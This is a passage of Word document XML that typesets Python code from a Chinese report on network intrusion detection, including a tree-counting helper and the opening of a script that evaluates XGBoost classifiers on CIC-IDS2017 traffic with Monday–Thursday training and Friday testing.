      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if hasattr(model, "get_booster"):  # xgboost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B433D81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return int(len(model.get_booster().get_dump()))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D947DE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if hasattr(model, "booster_"):  # lightgbm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8DEE8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return int(model.booster_.num_trees())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291ED4EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if hasattr(model, "tree_count_"):  # catboost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B55D7C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return int(model.tree_count_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FB29C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if hasattr(model, "tree_"):  # 单棵 CART</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6391A0DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C27ACFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AA397E">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="517BC370">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-19　tools/cross_day_eval.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（176 行）　M8 跨天留出实验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D86971D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""跨天留出的补充证据：训练日（周一至周四）→ 测试日（周五）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2E205B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D0B3B2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么单独做这个实验：按类内部时间留出（models/train.py --split temporal）测的是</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D67870">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"同一个类更晚的实例还能不能认出来"，仍然是闭集问题。CIC-IDS2017 更真实的失效模式是</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797126F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>**测试日出现训练时从未见过的攻击类型**——周五有 DDoS 和 PortScan，而周一至周四完全没有。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9EBADE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>六类闭集模型遇到这种行的行为只有两种：认成某个已知类，或者认成 BENIGN。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17528076">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1847112C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>这里跑两个实验：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE3DE65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E13F27E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  A. 闭集六类模型（只在周一至周四能见到的四类上训练）直接拿去测周五：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C49771">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     看 DDoS / PortScan 的行有多少被"至少报了警"（预测 != BENIGN），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027DD485">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     以及 BENIGN 行有多少被误报。这是开集检测能力的上界/下界的实测。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612E6ED8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  B. 二分类（BENIGN vs 攻击）在同样的跨天条件下训练和测试：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC207C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     看"只判断有没有攻击"这个更弱的问题，跨天后退化到什么程度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5508A9B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10E57167">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>结论无论正负都照实写。这个实验的目的不是证明模型好，是给报告里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A4ED66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"为什么在线路径需要大模型层兜底"提供实测依据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B555EFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3586D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AE18AF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B70080">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01E58517">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBF2859">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3E89DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A20559A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67775F77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59EC2680">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DE7364">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB8742B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.metrics import precision_recall_fscore_support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B62B78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from xgboost import XGBClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774D4503">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10938263">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356F8CE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from models.train import balanced_weights, load_dataset  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDFA21B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DE027E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>TRAIN_DAYS = ("Monday", "Tuesday", "Wednesday", "Thursday")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEB1ACF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>TEST_DAY = "Friday"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C07F67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77EFDCD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2162BCAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def day_of(source: str) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8DDE6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """把 '__source__'（如 Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv）映到星期。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0740B6E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return source.split("-", 1)[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C79607">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B8A0F60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0601820E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fit_xgb(X, y, seed):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296A78F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    n_classes = len(np.unique(y))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79872F89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = XGBClassifier(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265E4200">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=300,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711DDCC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_depth=8,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65EA494B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        learning_rate=0.1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6154F230">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        subsample=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C6E5A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        colsample_bytree=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B14024">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        objective="binary:logistic" if n_classes == 2 else "multi:softprob",</w:t>
      </w:r>
    </w:p>
